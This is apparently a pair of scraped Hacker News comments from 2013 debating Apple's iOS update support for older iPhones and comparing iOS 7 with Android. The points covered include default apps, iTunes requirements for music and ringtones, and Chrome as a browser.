If Apple decides a device is too slow to run a new major version of the OS, the decision will be condemned by people like u/jheriko. If Apple does let a 4 year old model run the new major release, people like u/gcb0 will complain that it’s slow.<p>Meanwhile, a three year old phone (iPhone 4) can run iOS 7 and run it well, albeit without fancy animations and parallax effect.

You could have bought a 3GS at a time where I wouldn&#x27;t have updates for even a year.  \nThe upgrades also shouldn&#x27;t be a reason for buying a phone, you buy a phone for what it can do now. You don&#x27;t know whether an update will be useful or not. \nWhat did iOS 6 add? Apple&#x27;s own Maps, Facebook integration (why is that an OS feature?).\nThose are all things that in Android are just app updates, any app can integrate with other apps and feature SSO & default apps (like Maps, SMS, browser) can be chosen by the user.<p>There are some things that iOS 7 does better then Android, and some things that Android does better. \nBoth have a target audience and both are really advanced, but neither is a truly better OS.<p>I currently own an iPhone 5S. And while I do love the fingerprint sensor and the back-gesture-swipe, there really are some oddities in iOS. Why can&#x27;t I use a mp3 as a ringtone without using iTunes? Why do I have to use iTunes to add music to my phone? Why can&#x27;t I choose Chrome as my default browser?",1386241121
